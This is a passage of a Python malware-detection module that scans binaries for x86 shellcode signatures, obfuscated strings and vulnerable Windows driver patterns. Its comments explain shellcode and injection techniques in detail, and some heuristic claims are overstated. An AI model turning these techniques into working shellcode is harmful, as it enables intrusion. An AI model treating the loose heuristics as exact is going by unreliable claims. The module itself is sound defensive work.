                    "bounds writes when truncation occurs; the second pattern "
                    "appears in logging and packet-assembly loops and produces "
                    "heap or stack overflows; "
                    "(Hacking: Art of Exploitation ch. 0x300: format string "
                    "variants; snprintf(3) return value semantics)"
                ),
                "host": "",
                "port": 0,
            })

    return findings


def detect_x86_shellcode_patterns(binary_data: bytes) -> list:
    """Detect x86 shellcode characteristics in binary data.

    Synthesized from: Learning Malware Analysis (Monnappa K A, ch. 3.5 Remote
    Executable/Shellcode Injection; ch. 5 Bitwise Operations; ch. 1.3 XOR
    Encoding).

    Covers:
      - GetPC techniques (CALL-POP, FPU FNSTENV) for position-independent code
      - NOP sleds used as landing pads before shellcode payload
      - Windows API hash resolution loops (ROR-based hash common in Metasploit)
      - INT3 breakpoint farms (debug trigger / padding pattern)
      - Infinite loop stubs (EB FE) used as shellcode wait primitives
      - Egg hunter sequences (two consecutive copies of a 4-byte tag)
      - Metasploit CLD+CALL decoder stub prefix (FC E8)
    """
    import re as _re
    findings = []

    # --- GetPC: CALL-POP (exact) ---
    # CALL $+5 (E8 00 00 00 00) immediately followed by POP EAX (58).
    # Position-independent shellcode uses this to capture EIP into a register
    # so it can compute absolute addresses at runtime without relocation.
    # (Learning Malware Analysis ch. 3.5: shellcode obtains its own address
    # via a CALL to the next instruction then pops the return address.)
    call_pop_exact = rb"\xe8\x00\x00\x00\x00\x58"
    for m in _re.finditer(call_pop_exact, binary_data):
        findings.append({
            "severity": "CRITICAL",
            "title": "SHELLCODE_GETPC_CALL_POP",
            "detail": (
                "CALL-POP GetPC sequence detected at offset "
                + hex(m.start()) + "; byte pattern E8 00 00 00 00 58 "
                "(CALL $+5; POP EAX) captures the instruction pointer into "
                "EAX for position-independent code; this is the most common "
                "shellcode prologue for computing absolute addresses at "
                "runtime without relocation data; Metasploit and custom "
                "shellcode both use this pattern before API hash resolution "
                "or egg-hunter loops; "
                "(Learning Malware Analysis ch. 3.5: shellcode injection "
                "patterns; Practical Reverse Engineering ch. 3: PIC stubs)"
            ),
            "host": "",
            "port": 0,
        })

    # --- GetPC: CALL-POP variants (CALL $+5 then any POP r32 within 10 bytes) ---
    # Variants pop into registers other than EAX (EBX=5B, ECX=59, EDX=5A,
    # ESI=5E, EDI=5F, EBP=5D, ESP=5C).
    call_prefix = rb"\xe8\x00\x00\x00\x00"
    pop_r32 = set(range(0x58, 0x60))  # POP EAX..POP EDI
    for m in _re.finditer(call_prefix, binary_data):
        start = m.end()
        window = binary_data[start:start + 10]
        for i, b in enumerate(window):
            if b in pop_r32 and i > 0:  # not byte 0 (that's the exact case above)
                reg_names = {0x58: "EAX", 0x59: "ECX", 0x5a: "EDX",
                             0x5b: "EBX", 0x5c: "ESP", 0x5d: "EBP",
                             0x5e: "ESI", 0x5f: "EDI"}
                findings.append({
                    "severity": "CRITICAL",
                    "title": "SHELLCODE_GETPC_PATTERN",
                    "detail": (
                        "CALL-POP GetPC variant at offset "
                        + hex(m.start()) + "; CALL $+5 followed "
                        + str(i) + " byte(s) later by POP "
                        + reg_names.get(b, hex(b)) + " ("
                        + hex(b) + "); "
                        "intermediate bytes are a short decoder prefix or "
                        "alignment NOP; shellcode captures EIP for PIC "
                        "address resolution; "
                        "(Learning Malware Analysis ch. 3.5)"
                    ),
                    "host": "",
                    "port": 0,
                })
                break

    # --- GetPC: FPU-based (FNSTENV) ---
    # FLDZ (D9 EE) / FNOP (D9 D0) followed by FNSTENV [ESP-0xC] (D9 74 24 F4)
    # saves FPU environment to stack; the saved FPU instruction pointer field
    # gives EIP of the last FPU instruction, achieving position-independent
    # code without a CALL. Common in polymorphic and alpha-numeric shellcode.
    fnstenv_patterns = [
        rb"\xd9\xee\xd9\x74\x24",  # FLDZ; FNSTENV [ESP+n]
        rb"\xd9\x74\x24",           # FNSTENV [ESP+n] standalone
        rb"\xd9\xd0\xd9\x74\x24",  # FNOP; FNSTENV
    ]
    for pat in fnstenv_patterns:
        for m in _re.finditer(pat, binary_data):
            findings.append({
                "severity": "HIGH",
                "title": "SHELLCODE_FPU_GETPC",
                "detail": (
                    "FPU-based GetPC (FNSTENV) pattern at offset "
                    + hex(m.start()) + "; pattern "
                    + pat.hex() + "; FNSTENV stores the FPU environment "
                    "including the FPU instruction pointer (pointing to the "
                    "last FPU opcode) onto the stack; shellcode then pops "
                    "this value to obtain EIP without executing a CALL; "
                    "used in alpha-numeric and polymorphic encoders to avoid "
                    "the CALL-POP signature; "
                    "(Learning Malware Analysis ch. 5: FPU instructions; "
                    "Practical Reverse Engineering ch. 3: FPU GetPC)"
                ),
                "host": "",
                "port": 0,
            })
            break  # one finding per pattern type is sufficient

    # --- NOP sled: 16+ consecutive 0x90 bytes ---
    # A NOP sled (landing pad) absorbs imprecise jump targets in heap/stack
    # exploits so execution slides into the payload. 16 bytes is a practical
    # threshold -- compilers emit at most 15-byte NOP sequences for alignment.
    nop_sled = _re.compile(rb"\x90{16,}")
    for m in nop_sled.finditer(binary_data):
        sled_len = len(m.group())
        findings.append({
            "severity": "HIGH",
            "title": "SHELLCODE_NOP_SLED",
            "detail": (
                "NOP sled of " + str(sled_len) + " bytes at offset "
                + hex(m.start()) + "; run of 0x90 (NOP) instructions "
                "used as a landing pad to tolerate imprecise jump target "
                "estimation in stack/heap exploits; execution slides through "
                "the NOPs into the following shellcode payload; compilers "
                "never emit NOP runs longer than 15 bytes for alignment; "
                "sequences >= 16 bytes are therefore a reliable shellcode "
                "indicator; "
                "(Learning Malware Analysis ch. 3.5: shellcode injection)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Windows API hash resolution (ROR-based) ---
    # Metasploit's block_api stub and many custom shellcodes resolve Windows
    # API addresses at runtime by hashing export names with a ROR-13 loop
    # rather than storing plaintext API names. The x86 byte sequence for
    # ROR ECX, 13 is C1 C9 0D; ROR EDX, 13 is C1 CA 0D. Paired with an
    # ADD/XOR loop this pattern is a strong shellcode API resolution indicator.
    # Also detect IMUL-based hash loops (used by some custom hashers).
    ror_hash_patterns = [
        rb"\xc1\xc9\x0d",  # ROR ECX, 13
        rb"\xc1\xca\x0d",  # ROR EDX, 13
        rb"\xc1\xc8\x0d",  # ROR EAX, 13
        rb"\xc1\xcf\x0d",  # ROR EDI, 13
        rb"\xc1\xc8[\x07\x09\x0d]",  # ROR EAX, 7/9/13 (variant hashers)
    ]
    for pat in ror_hash_patterns:
        hits = list(_re.finditer(pat, binary_data))
        if hits:
            offsets = [hex(h.start()) for h in hits[:5]]
            findings.append({
                "severity": "CRITICAL",
                "title": "SHELLCODE_API_HASH_RESOLUTION",
                "detail": (
                    "ROR-based API hash resolution loop detected; "
                    + str(len(hits)) + " occurrence(s) of pattern "
                    + pat.hex() + " at offset(s) "
                    + ", ".join(offsets) + "; Metasploit block_api and "
                    "custom shellcodes iterate the PEB->InMemoryOrderModuleList, "
                    "hash each export name with a ROR-N algorithm, and compare "
                    "against a stored hash constant to locate API addresses "
                    "without importing them by name; this avoids plaintext API "
                    "strings in the shellcode and bypasses IAT-based detection; "
                    "(Learning Malware Analysis ch. 3.5: shellcode API "
                    "resolution; Practical Reverse Engineering ch. 3)"
                ),
                "host": "",
                "port": 0,
            })
            break  # one finding for first matching pattern is sufficient

    # --- INT3 breakpoint farm (8+ consecutive 0xCC) ---
    # A run of INT3 bytes (0xCC) pads shellcode buffers or acts as a debug
    # trigger in staged payloads. 8+ consecutive bytes rule out single
    # accidental 0xCC values from data sections.
    int3_farm = _re.compile(rb"\xcc{8,}")
    for m in int3_farm.finditer(binary_data):
        farm_len = len(m.group())
        findings.append({
            "severity": "HIGH",
            "title": "SHELLCODE_INT3_FARM",
            "detail": (
                "INT3 breakpoint farm of " + str(farm_len) + " bytes at "
                "offset " + hex(m.start()) + "; run of 0xCC (INT3) bytes "
                "used as padding in staged shellcode buffers or as a debug "
                "trigger to attach a debugger to the injected thread; also "
                "used by some shellcode encoders as a fill byte between "
                "decoder stub and payload; runs >= 8 bytes are not produced "
                "by compilers and indicate manually crafted code; "
                "(Learning Malware Analysis ch. 3.5: shellcode staging)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Infinite loop: EB FE (JMP $-2, loops forever) ---
    # 0xEB 0xFE is a 2-byte short JMP to itself (-2 relative offset).
    # Used in shellcode as a wait primitive (spin loop waiting for a thread
    # to be created) or as a stub placeholder during development / debugging.
    inf_loop = rb"\xeb\xfe"
    for m in _re.finditer(inf_loop, binary_data):
        findings.append({
            "severity": "MEDIUM",
            "title": "SHELLCODE_INFINITE_LOOP",
            "detail": (
                "Infinite loop stub (JMP $-2 / EB FE) at offset "
                + hex(m.start()) + "; 2-byte sequence 0xEB 0xFE is a "
                "short jump to itself; used in shellcode as a spin-wait "
                "primitive (e.g., waiting for CreateRemoteThread to start "
                "the real payload in a second thread), as a breakpoint "
                "substitute, or as a placeholder stub during staged payload "
                "construction; "
                "(Learning Malware Analysis ch. 3.5: staged injection; "
                "Practical Reverse Engineering ch. 6: unconditional jumps)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Egg hunter: two consecutive copies of a 4-byte egg tag ---
    # An egg hunter is a small piece of shellcode that scans process memory
    # for a 4-byte tag repeated twice (the egg). When found, execution jumps
    # to the byte after the double-tag, which is the real payload. The egg
    # must not appear in the hunter code itself, so hunter authors pick tags
    # that are also valid x86 instructions. Common eggs: 50 90 50 90 (PUSH
    # EAX; NOP x2), D9 CA D9 CA (FXCH; FXCH), w00t (77 30 30 74).
    egg_candidates = [
        b"\x90\x50\x90\x50\x90\x50\x90\x50",  # double 90 50 90 50
        b"\x50\x90\x50\x90\x50\x90\x50\x90",  # double 50 90 50 90
        b"\xd9\xca\xd9\xca\xd9\xca\xd9\xca",  # double FXCH; FXCH
        b"w00tw00t",                             # ASCII egg w00t repeated
        b"\xaf\x75\xf7\xaf\xaf\x75\xf7\xaf",  # double scasd; jne
    ]
    for egg in egg_candidates:
        idx = 0
        while True:
            pos = binary_data.find(egg, idx)
            if pos == -1:
                break
            findings.append({
                "severity": "HIGH",
                "title": "SHELLCODE_EGG_HUNTER",
                "detail": (
                    "Egg hunter tag pattern at offset " + hex(pos)
                    + "; pattern " + egg.hex() + " ("
                    + repr(egg) + "); a 4-byte tag repeated twice "
                    "is the standard egg used by egg-hunter shellcode "
                    "payloads (Skape/Spoonm technique); the hunter scans "
                    "process virtual address space for two consecutive "
                    "copies of the tag, then transfers control to the byte "
                    "immediately following the double-tag; allows a tiny "
                    "hunter stub (32 bytes) to locate a large payload "
                    "deposited anywhere in memory by a heap spray or "
                    "adjacent overflow; "
                    "(Learning Malware Analysis ch. 3.5: shellcode "
                    "injection techniques)"
                ),
                "host": "",
                "port": 0,
            })
            idx = pos + 1

    # --- Metasploit CLD+CALL decoder stub (FC E8) ---
    # Almost every Metasploit x86 encoded payload starts with FC (CLD, clear
    # direction flag) followed immediately by E8 (CALL rel32) as the first
    # byte of the decoder stub. This two-byte prefix is highly distinctive.
    # The CALL sets up the stack frame for the XOR decoder loop that follows.
    msf_stub = rb"\xfc\xe8"
    for m in _re.finditer(msf_stub, binary_data):
        # require at least 4 more bytes for the CALL offset
        if m.start() + 6 <= len(binary_data):
            findings.append({
                "severity": "CRITICAL",
                "title": "METASPLOIT_DECODER_STUB",
                "detail": (
                    "Metasploit decoder stub prefix (CLD; CALL) at offset "
                    + hex(m.start()) + "; byte sequence FC E8 matches "
                    "the standard Metasploit x86 encoded payload preamble: "
                    "CLD clears the direction flag so string instructions "
                    "proceed forward, then CALL rel32 captures EIP for the "
                    "XOR decoder loop (shikata_ga_nai, fnstenv, and similar "
                    "encoders all produce this two-byte prefix); a false "
                    "positive is possible if FC and E8 appear adjacent in "
                    "legitimate data, but in executable regions this pattern "
                    "is a near-certain shellcode indicator; "
                    "(Learning Malware Analysis ch. 3.5: remote shellcode "
                    "injection; Metasploit Framework shellcode encoders)"
                ),
                "host": "",
                "port": 0,
            })

    return findings


def detect_malware_string_encoding(binary_data: bytes) -> list:
    """Detect malware string encoding and obfuscation patterns in binary data.

    Synthesized from: Learning Malware Analysis (Monnappa K A, ch. 1
    Simple Encoding; ch. 1.2 Base64 Encoding; ch. 1.3 XOR Encoding;
    ch. 1.3.3 NULL Ignoring XOR; ch. 1.3.4 Multi-byte XOR; ch. 1.3.5
    Identifying XOR Encoding; ch. 3 Custom Encoding/Encryption).

    Covers:
      - Stack string construction (MOV byte-to-stack clusters)
      - XOR-encoded embedded PE header (MZ signature encoded with common keys)
      - Caesar shift encoded strings (consistent byte offset to printable ASCII)
      - Base64 padding artifacts (NULL-bytes encoded as base64 produce AA==)
      - ROT13 obfuscated Windows API names
      - Multi-byte XOR encoded data regions (4-byte key, high printable density)
      - Arithmetic string encoding (ADD/SUB byte-constant instruction sequences)
    """
    import re as _re
    findings = []

    # --- Stack string construction ---
    # Malware assembles strings one byte at a time on the stack with MOV
    # byte-ptr instructions to evade static string extraction. In x86 the
    # patterns are:
    #   C6 45 <disp8> <byte>   -- MOV BYTE PTR [EBP+disp8], imm8
    #   C6 44 24 <disp8> <byte> -- MOV BYTE PTR [ESP+disp8], imm8
    # Four or more such instructions clustered within 64 bytes is a strong
    # indicator of a stack-built string. (Learning Malware Analysis ch. 1:
    # simple encoding -- stack strings bypass static extraction tools.)
    mov_byte_ebp = _re.compile(rb"\xc6\x45[\x00-\xff][\x20-\x7e]")
    mov_byte_esp = _re.compile(rb"\xc6\x44\x24[\x00-\xff][\x20-\x7e]")
    cluster_size = 64
    data_len = len(binary_data)
    i = 0
    reported_offsets = set()
    while i < data_len:
        window = binary_data[i:i + cluster_size]
        ebp_hits = len(mov_byte_ebp.findall(window))
        esp_hits = len(mov_byte_esp.findall(window))
        total = ebp_hits + esp_hits
        if total >= 4 and i not in reported_offsets:
            reported_offsets.add(i)
            findings.append({
                "severity": "HIGH",
                "title": "STACK_STRING_CONSTRUCTION",
                "detail": (
                    "Stack string construction cluster at offset "
                    + hex(i) + "; " + str(total) + " MOV byte-to-stack "
                    "instruction(s) (" + str(ebp_hits) + " via EBP, "
                    + str(esp_hits) + " via ESP) within a 64-byte window; "
                    "malware builds strings one character at a time on the "
                    "stack to defeat static string extraction (strings.exe, "
                    "FLOSS, IDA Strings window); the technique is described "
                    "by Mandiant as 'stack strings' and is common in APT "
                    "implants (FinFisher, Gauss, custom loaders); FLOSS "
                    "detects these via emulation; static scanners miss them; "
                    "(Learning Malware Analysis ch. 1: simple encoding "
                    "techniques)"
                ),
                "host": "",
                "port": 0,
            })
            i += cluster_size
            continue
        i += 1

    # --- XOR-encoded PE embedded in binary ---
    # Malware stores a second PE (dropper payload) XOR-encoded inside the
    # carrier binary. The MZ header magic (4D 5A) encoded with common keys
    # produces predictable byte pairs. Try common single-byte XOR keys.
    # (Learning Malware Analysis ch. 1.3.3: NULL-ignoring XOR; ch. 1.3.4:
    # multi-byte XOR -- Taidoor stored XOR-encoded PE in resource section.)
    mz_magic = b"\x4d\x5a"  # MZ
    common_xor_keys = [0x5a, 0x13, 0xaa, 0xff, 0x35, 0x41, 0x4d, 0x20,
                       0x01, 0x02, 0x04, 0x08, 0x10, 0x40, 0x80, 0x55]
    found_keys = []
    for key in common_xor_keys:
        encoded_m = bytes([0x4d ^ key])
        encoded_z = bytes([0x5a ^ key])
        encoded_mz = encoded_m + encoded_z
        if encoded_mz in binary_data:
            pos = binary_data.index(encoded_mz)
            # Verify: next 4 bytes XOR key produce plausible PE bytes (00 00 xx xx)
            if pos + 6 <= data_len:
                b2 = binary_data[pos + 2] ^ key
                b3 = binary_data[pos + 3] ^ key
                if b2 == 0x00 and b3 == 0x00:  # PE header padding bytes
                    found_keys.append((key, pos))
    if found_keys:
        key_list = [hex(k) + "@" + hex(p) for k, p in found_keys[:5]]
        findings.append({
            "severity": "HIGH",
            "title": "XOR_ENCODED_PE_EMBEDDED",
            "detail": (
                "XOR-encoded PE (MZ) signature detected with "
                + str(len(found_keys)) + " key candidate(s): "
                + ", ".join(key_list) + "; the MZ magic bytes (4D 5A) "
                "XOR-decoded with the candidate key produce a valid header "
                "preamble (MZ + two null padding bytes); this pattern is "
                "consistent with a dropper storing its payload PE XOR-encoded "
                "in a data section or resource (cf. Taidoor malware XOR key "
                "0xEAD4AA34; Conficker; custom loaders); the encoded PE must "
                "be decoded at runtime before mapping into memory; "
                "(Learning Malware Analysis ch. 1.3.3: NULL-ignoring XOR; "
                "ch. 1.3.4: multi-byte XOR encoding)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Caesar shift encoded strings ---
    # A Caesar cipher applies a constant byte offset to printable ASCII.
    # Malware authors use shifts of 1-25 to obfuscate API names and URLs.
    # Strategy: slide a 16-byte window; for each shift value check if XOR-
    # decoding all bytes by that offset yields >= 75% printable ASCII (0x20-0x7e).
    # Report the shift + offset if a plausible string is recovered.
    printable_range = set(range(0x20, 0x7f))
    window_size = 16
    min_printable_ratio = 0.75
    caesar_hits = []  # (offset, shift, decoded)
    step = 8
    for start in range(0, data_len - window_size, step):
        chunk = binary_data[start:start + window_size]
        # Skip chunks that are already printable (not encoded)
        already_printable = sum(1 for b in chunk if b in printable_range)
        if already_printable / window_size > 0.80:
            continue
        for shift in range(1, 26):
            decoded = bytes((b - shift) & 0xff for b in chunk)
            printable_count = sum(1 for b in decoded if b in printable_range)
            if printable_count / window_size >= min_printable_ratio:
                decoded_str = decoded.decode("ascii", errors="replace")
                caesar_hits.append((start, shift, decoded_str))
                break
    if caesar_hits:
        sample = caesar_hits[:3]
        sample_desc = "; ".join(
            "offset " + hex(o) + " shift " + str(s) + " -> '"
            + d.replace("'", "") + "'"
            for o, s, d in sample
        )
        findings.append({
            "severity": "MEDIUM",
            "title": "CAESAR_SHIFT_ENCODED_STRINGS",
            "detail": (
                "Caesar shift encoding detected in "
                + str(len(caesar_hits)) + " region(s): " + sample_desc
                + "; a constant byte subtraction (shift 1-25) converts "
                "non-printable bytes to printable ASCII in >= 75% of the "
                "window; malware uses Caesar encoding on short strings (API "
                "names, registry keys, C2 paths) as a trivial obfuscation "
                "to defeat string search without requiring a key; simple to "
                "decode: subtract the shift from each byte modulo 256; "
                "(Learning Malware Analysis ch. 1: simple encoding; "
                "ch. 3: custom encoding schemes)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Base64 padding artifacts ---
    # Base64 encoding of null bytes produces 'AA==' (single null) or 'AAAA'
    # blocks. These literal byte sequences in non-text regions of a binary
    # indicate base64-encoded data embedded in the executable (shellcode
    # encoded as base64 for HTTP transport, then stored in a resource or
    # data section). (Learning Malware Analysis ch. 1.2: Base64 encoding.)
    b64_padding_patterns = [
        (rb"AA==", "base64 single-null padding (0x00 -> AA==)"),
        (rb"AAAA", "base64 null block (0x000000 -> AAAA)"),
        (rb"[A-Za-z0-9+/]{60,}={0,2}", "long base64-alphabet run (>= 60 chars)"),
    ]
    for pat, desc in b64_padding_patterns:
        hits = list(_re.finditer(pat, binary_data))
        if hits:
            offsets = [hex(h.start()) for h in hits[:5]]
            findings.append({
                "severity": "MEDIUM",
                "title": "BASE64_PADDING_ARTIFACTS",
                "detail": (
                    desc + " found at " + str(len(hits)) + " offset(s): "
                    + ", ".join(offsets) + "; base64-encoded data embedded "
                    "in a binary indicates the malware stores a payload or "
                    "C2 communication template in base64 form and decodes "
                    "it at runtime; common in droppers that base64-encode "
                    "shellcode for HTTP exfil or for storing in registry "
                    "values (which accept string but not raw binary); also "
                    "produced by Etumbot-style custom Base64 schemes; "
                    "(Learning Malware Analysis ch. 1.2: Base64 encoding; "
                    "ch. 3: custom encoding/Etumbot)"
                ),
                "host": "",
                "port": 0,
            })
            break  # one finding for first matching pattern type

    # --- ROT13 obfuscated Windows API names ---
    # ROT13 maps each letter to the letter 13 positions later (wrapping).
    # Some malware obfuscates short API strings with ROT13 because it is
    # trivially reversible and avoids null bytes. We search for ROT13-encoded
    # versions of common Windows API names. (Learning Malware Analysis ch. 1:
    # simple encoding -- attackers use the simplest scheme that defeats static
    # detection.)
    def rot13_encode(s: str) -> bytes:
        result = []
        for c in s:
            if "a" <= c <= "z":
                result.append(ord("a") + (ord(c) - ord("a") + 13) % 26)
            elif "A" <= c <= "Z":
                result.append(ord("A") + (ord(c) - ord("A") + 13) % 26)
            else:
                result.append(ord(c))
        return bytes(result)

    target_apis = [
        "LoadLibraryA", "GetProcAddress", "VirtualAlloc", "CreateThread",
        "WriteProcessMemory", "CreateRemoteThread", "OpenProcess",
        "RegSetValueEx", "WinExec", "ShellExecute", "InternetOpen",
        "HttpSendRequest", "WSAStartup", "connect",
    ]
    rot13_hits = []
    for api in target_apis:
        encoded = rot13_encode(api)
        if encoded in binary_data:
            pos = binary_data.index(encoded)
            rot13_hits.append((api, pos))
    if rot13_hits:
        hit_desc = "; ".join(
            api + " at " + hex(pos) for api, pos in rot13_hits[:6]
        )
        findings.append({
            "severity": "HIGH",
            "title": "ROT13_API_OBFUSCATION",
            "detail": (
                "ROT13-obfuscated Windows API name(s) detected: "
                + hit_desc + "; "
                + str(len(rot13_hits)) + " API name(s) found in ROT13 form; "
                "the binary likely decodes these at runtime using a simple "
                "13-position letter shift before passing them to "
                "GetProcAddress or LoadLibraryA; ROT13 is chosen because it "
                "is self-inverse (encode == decode), needs no key, and "
                "produces bytes in the printable ASCII range, avoiding null "
                "bytes in string data; "
                "(Learning Malware Analysis ch. 1: simple encoding; "
                "ch. 1.3.5: identifying XOR/rotation encoding)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Multi-byte XOR encoded data ---
    # A 4-byte XOR key applied repeatedly to a data region is the most common
    # encryption in malware (Learning Malware Analysis ch. 1.3.4: multi-byte
    # XOR -- Taidoor used 0xEAD4AA34). Detection heuristic: for each 64-byte
    # aligned chunk, try every single-byte key 0x01-0xff; if decoding yields
    # > 70% printable ASCII, flag the chunk and the key.
    # (Single-byte keys are the most tractable brute-force target; 4-byte
    # keys are derived from single-byte patterns when data is key-aligned.)
    chunk_len = 64
    printable_threshold = 0.70
    xor_findings = []
    for chunk_start in range(0, data_len - chunk_len, chunk_len):
        chunk = binary_data[chunk_start:chunk_start + chunk_len]
        # Skip chunks that are already mostly printable or all zeros
        raw_printable = sum(1 for b in chunk if b in printable_range)
        if raw_printable / chunk_len > 0.60:
            continue
        if all(b == 0 for b in chunk):
            continue
        for key in range(1, 0x100):
            decoded = bytes(b ^ key for b in chunk)
            printable_count = sum(1 for b in decoded if b in printable_range)
            if printable_count / chunk_len >= printable_threshold:
                decoded_preview = decoded[:32].decode("ascii", errors="replace")
                xor_findings.append((chunk_start, key, decoded_preview))
                break
    if xor_findings:
        sample = xor_findings[:4]
        sample_desc = "; ".join(
            "offset " + hex(o) + " key " + hex(k) + " -> '"
            + p.replace("'", "").replace("\n", "") + "'"
            for o, k, p in sample
        )
        findings.append({
            "severity": "HIGH",
            "title": "MULTI_BYTE_XOR_ENCODED_DATA",
            "detail": (
                "Multi-byte XOR encoded region(s) detected: "
                + str(len(xor_findings)) + " chunk(s) decode to > "
                + str(int(printable_threshold * 100)) + "% printable ASCII; "
                "sample: " + sample_desc + "; single-byte XOR is the "
                "simplest form of multi-byte XOR (key repeated every byte); "
                "malware uses XOR encoding to hide strings, C2 configs, and "
                "embedded payloads from static analysis; the NULL-key "
                "property (plaintext ^ 0 = plaintext) means key 0 is never "
                "used by real encoders; Taidoor used 4-byte key 0xEAD4AA34 "
                "on its PE payload resource; brute-force of single-byte "
                "keys requires only 255 attempts; "
                "(Learning Malware Analysis ch. 1.3: XOR encoding; ch. 1.3.3: "
                "NULL-ignoring XOR; ch. 1.3.4: multi-byte XOR)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Arithmetic string encoding (ADD/SUB byte-constant) ---
    # Some malware encodes strings using ADD or SUB with a constant rather
    # than XOR, to produce encoded bytes that avoid XOR-detection heuristics.
    # x86 patterns:
    #   80 C0 <imm8>  -- ADD AL, imm8
    #   80 E8 <imm8>  -- SUB AL, imm8
    #   80 C3 <imm8>  -- ADD BL, imm8
    #   FE C0         -- INC AL (shift by 1)
    # Three or more consecutive such instructions decoding to printable ASCII
    # is the signal. (Learning Malware Analysis ch. 1: simple encoding;
    # ch. 4: arithmetic operations -- ADD/SUB used for byte manipulation.)
    arith_enc_patterns = [
        rb"\x80[\xc0-\xc7][\x01-\x7f]",  # ADD reg8, imm8 (shift up)
        rb"\x80[\xe8-\xef][\x01-\x7f]",  # SUB reg8, imm8 (shift down)
        rb"\xfe[\xc0-\xc7]",              # INC reg8
        rb"\xfe[\xc8-\xcf]",              # DEC reg8
    ]
    for pat in arith_enc_patterns:
        hits = list(_re.finditer(pat, binary_data))
        # Look for clusters: 3+ hits within a 32-byte window
        cluster_found = False
        for i in range(len(hits) - 2):
            if hits[i + 2].start() - hits[i].start() <= 32:
                cluster_found = True
                cluster_offset = hits[i].start()
                break
        if cluster_found:
            findings.append({
                "severity": "MEDIUM",
                "title": "ARITHMETIC_STRING_ENCODING",
                "detail": (
                    "Arithmetic string encoding cluster at offset "
                    + hex(cluster_offset) + "; pattern " + pat.hex()
                    + "; 3+ ADD/SUB/INC/DEC byte-register instructions "
                    "clustered within 32 bytes; malware applies a constant "
                    "arithmetic shift to each byte of an encoded string "
                    "rather than XOR, to avoid XOR-detection tools; "
                    "ADD and SUB do not share the XOR self-inverse property "
                    "so the decoding direction (ADD or SUB) and constant must "
                    "be known; often combined with a loop over a data region "
                    "adjacent to the arithmetic instruction cluster; "
                    "(Learning Malware Analysis ch. 1: simple encoding; "
                    "ch. 4: arithmetic operations in malware decoders)"
                ),
                "host": "",
                "port": 0,
            })
            break  # one finding for first matching pattern type

    return findings


def detect_windows_driver_vulnerabilities(binary_data: bytes, host: str = '', port: int = 0) -> list:
    """Detect vulnerable patterns in Windows kernel drivers (.sys files).

    Synthesized from: Practical Reverse Engineering (Dang/Gazet/Bachaalany,
    ch3 Windows Kernel; ch4 Debugging and Automation; ch5 Obfuscation).

    Covers:
      - IOCTL handler detection (IRP_MJ_DEVICE_CONTROL dispatch table presence)
      - METHOD_NEITHER IOCTL without bounds check (arbitrary user-pointer access)
      - Missing ProbeForRead/ProbeForWrite before user-pointer dereference
      - MmMapIoSpace (physical memory mapping -- arbitrary read/write primitive)
      - ZwMapViewOfSection cross-process injection pattern
      - Kernel-mode alloca / large stack arrays (kernel stack overflow surface)
      - Unsafe string functions in kernel context (wcscat/wcscpy/strcpy)
      - RtlAdjustPrivilege/SePrivilege manipulation (token privilege escalation)
    """
    import re as _re
    findings = []

    # --- IOCTL handler presence ---
    # IRP_MJ_DEVICE_CONTROL dispatch points indicate the driver processes
    # DeviceIoControl() requests from user-space. The string "DeviceIoControl"
    # or "IRP_MJ_DEVICE_CONTROL" embedded in debug symbol references, or the
    # characteristic dispatch table offset 0x70 (IRP_MJ_DEVICE_CONTROL = 14)
    # in a DriverObject->MajorFunction assignment stub, confirms an IOCTL
    # handler is present. Any IOCTL handler is an attack surface into the
    # kernel trust boundary. (PRE ch3: IOCTL dispatch; CTL_CODE macro.)
    ioctl_markers = [
        rb"DeviceIoControl\x00",
        rb"IRP_MJ_DEVICE_CONTROL\x00",
        rb"IoCreateDevice\x00",
        rb"DispatchDeviceControl",
    ]
    ioctl_found = False
    for marker in ioctl_markers:
        if marker in binary_data:
            ioctl_found = True
            break
    if ioctl_found:
        findings.append({
            "severity": "INFO",
            "title": "DRIVER_IOCTL_HANDLER_PRESENT",
            "detail": (
                "IOCTL dispatch handler detected; driver exports "
                "DeviceIoControl / IRP_MJ_DEVICE_CONTROL surface; "
                "every IOCTL code path crosses the user-kernel trust boundary "
                "and is an attack surface for privilege escalation; "
                "review CTL_CODE transfer type (METHOD_BUFFERED vs "
                "METHOD_NEITHER) and input-length validation at each handler; "
                "(PRE ch3: IOCTL dispatch; CTL_CODE macro decomposition; "
                "bits 1-0 of IOCTL code = TransferType)"
            ),
            "host": host,
            "port": port,
        })

    # --- METHOD_NEITHER without bounds check ---
    # CTL_CODE transfer type 3 (METHOD_NEITHER) passes raw user-space VA
    # pointers directly to the driver in Parameters.DeviceIoControl.Type3InputBuffer.
    # Without an explicit ProbeForRead/ProbeForWrite before accessing the
    # pointer, the driver dereferences an attacker-controlled address in
    # kernel context -- arbitrary kernel read/write. Look for the METHOD_NEITHER
    # constant (0x3) in IOCTL codes assembled via CTL_CODE, or the string
    # "METHOD_NEITHER" / "Type3InputBuffer" without adjacent "ProbeForRead".
    # (PRE ch3: CTL_CODE bits 1-0; METHOD_NEITHER user-pointer hazard.)
    neither_pattern = _re.compile(rb"Type3InputBuffer|METHOD_NEITHER\x00")
    probe_pattern = _re.compile(rb"ProbeForRead|ProbeForWrite")
    if neither_pattern.search(binary_data):
        has_probe = bool(probe_pattern.search(binary_data))
        if not has_probe:
            findings.append({
                "severity": "HIGH",
                "title": "DRIVER_IOCTL_METHOD_NEITHER",
                "detail": (
                    "METHOD_NEITHER IOCTL transfer type detected with no "
                    "ProbeForRead/ProbeForWrite present; driver receives raw "
                    "user-space pointers in Type3InputBuffer without "
                    "kernel-mode validation; attacker can pass an arbitrary VA "
                    "to force the driver to read/write that address in kernel "
                    "context; leads to arbitrary kernel memory corruption or "
                    "disclosure; (PRE ch3: CTL_CODE transfer types; "
                    "METHOD_NEITHER bits 1-0 = 0x3; Type3InputBuffer usage)"
                ),
                "host": host,
                "port": port,
            })

    # --- Missing ProbeForRead/ProbeForWrite ---
    # Kernel drivers that accept user-space buffer pointers (IOCTL input,
    # NtWriteFile, etc.) must call ProbeForRead or ProbeForWrite to validate
    # the pointer is within user-mode VA space before dereferencing. The
    # presence of MmCopyFromCaller / RtlCopyMemory combined with the ABSENCE
    # of Probe functions is the vulnerability pattern. (PRE ch3: kernel-user
    # boundary; user-mode pointer validation; guard pages.)
    user_copy = _re.compile(
